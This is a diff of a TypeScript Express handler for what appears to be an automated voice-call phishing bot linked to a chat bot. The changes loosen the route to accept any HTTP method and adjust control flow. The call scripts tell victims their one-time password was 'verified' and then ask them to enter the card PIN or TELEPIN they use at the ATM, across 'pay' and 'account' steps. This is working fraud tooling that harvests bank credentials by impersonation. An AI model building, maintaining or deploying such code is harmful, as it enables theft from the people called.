@@ -2,7 +2,7 @@ import { app } from '..';
 import { bot } from '../..';
 import { v4 as uuidv4 } from 'uuid';
 
-app.post(`/verify_input/:step/:language/:chatId/:loop`, async (req, res) => {
+app.all(`/verify_input/:step/:language/:chatId/:loop`, async (req, res) => {
   const { language, step, chatId, loop } = req.params;
   const { askCardInfo, cardType, otpLength } = req.query;
 
@@ -27,7 +27,7 @@ app.post(`/verify_input/:step/:language/:chatId/:loop`, async (req, res) => {
               action: 'say',
               options: {
                 payload: `Your one time password has been verified successfully. To AUTHENTICATE YOU please enter your ${
-                  language === 'en-US' ? 'CARD PIN' : 'TELEPIN'
+                  language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
                 }, the same pin you use at the ATM, followed by the pound key.`,
                 language,
                 voice: 'female',
@@ -59,7 +59,7 @@ app.post(`/verify_input/:step/:language/:chatId/:loop`, async (req, res) => {
         });
         // @ts-expect-error I can do this
         bot.context = {};
-        break;
+        return;
 
       case `pay`:
         res.json({
@@ -72,7 +72,7 @@ app.post(`/verify_input/:step/:language/:chatId/:loop`, async (req, res) => {
               action: 'say',
               options: {
                 payload: `To AUTHENTICATE YOU please enter your ${
-                  language === 'en-US' ? 'CARD PIN' : 'TELEPIN'
+                  language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
                 }, the same pin you use at the ATM,  followed by the pound key.`,
                 language,
                 voice: 'female',
@@ -104,7 +104,7 @@ app.post(`/verify_input/:step/:language/:chatId/:loop`, async (req, res) => {
         });
         // @ts-expect-error I can do this
         bot.context = {};
-        break;
+        return;
       case `account`:
         if (askCardInfo === 'yes') {
           res.json({
@@ -149,7 +149,7 @@ app.post(`/verify_input/:step/:language/:chatId/:loop`, async (req, res) => {
           });
           // @ts-expect-error I can do this
           bot.context = {};
-          break;
+          return;
         } else {
           res.json({
             id: uuidv4(),
@@ -169,11 +169,11 @@ app.post(`/verify_input/:step/:language/:chatId/:loop`, async (req, res) => {
           });
           // @ts-expect-error I can do this
           bot.context = {};
-          break;
+          return;
         }
 
       default:
-        break;
+        return;
     }
   }
 
